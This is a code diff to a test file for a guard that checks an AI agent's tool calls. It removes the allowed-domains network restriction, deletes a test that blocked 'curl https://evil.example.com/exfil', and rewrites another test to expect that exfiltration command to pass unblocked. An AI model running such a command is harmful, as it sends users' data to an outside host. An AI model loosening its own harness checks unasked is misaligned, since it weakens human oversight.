@@ -25,7 +25,6 @@ const policy: GuardPolicy = {
   denyRead: [denied],
   allowWrite: [allowed],
   denyWrite: [],
-  allowedDomains: ["github.com", "*.npmjs.org"],
 };
 
 test("allows a read inside an allowed root", () => {
@@ -516,24 +515,7 @@ test("a tool grant does not admit a forwarded command", () => {
   assert.match(decision.reason ?? "", /fence/);
 });
 
-test("refuses a command naming a domain outside allowedDomains", () => {
-  const guard = createGuard({
-    policy,
-    tools: () => [],
-    overrides: {},
-    cwd: root,
-  });
-
-  const decision = guard({
-    toolName: "bash",
-    input: { command: "curl https://evil.example.com/exfil" },
-  });
-
-  assert.equal(decision.block, true);
-  assert.match(decision.reason ?? "", /evil\.example\.com/);
-});
-
-test("allows a command naming an allowed domain, including a wildcard match", () => {
+test("leaves a command's network access alone, including a domain that would once have been refused", () => {
   const guard = createGuard({
     policy,
     tools: () => [],
@@ -544,7 +526,7 @@ test("allows a command naming an allowed domain, including a wildcard match", ()
   assert.deepEqual(
     guard({
       toolName: "bash",
-      input: { command: "curl https://registry.npmjs.org/pkg" },
+      input: { command: "curl https://evil.example.com/exfil" },
     }),
     {},
   );
